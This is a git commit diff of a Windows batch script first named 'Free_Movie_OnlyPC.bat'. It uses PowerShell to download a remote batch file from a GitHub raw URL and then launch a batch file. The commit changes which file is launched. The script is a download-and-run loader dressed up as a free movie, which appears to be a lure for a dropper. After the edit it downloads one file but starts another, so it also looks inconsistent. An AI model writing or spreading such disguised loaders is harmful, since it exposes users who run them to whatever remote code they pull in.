ad316dd22840db61ff89b0904411fdee1dc2f7ff
LKR-beta <gbu23224@gmail.com>
2024-09-24 18:27:22 +0900

    Update and rename Free_Movie_OnlyPC.bat to Completed-1.bat

--- Completed-1.bat
+++ Completed-1.bat
@@ -3,7 +3,7 @@ cls
 
 powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR-beta/nope/raw/main/video.bat','C:\your\asylum\video.bat')"
 
-start video.bat
+start code-1.bat
 
 pause
 exit
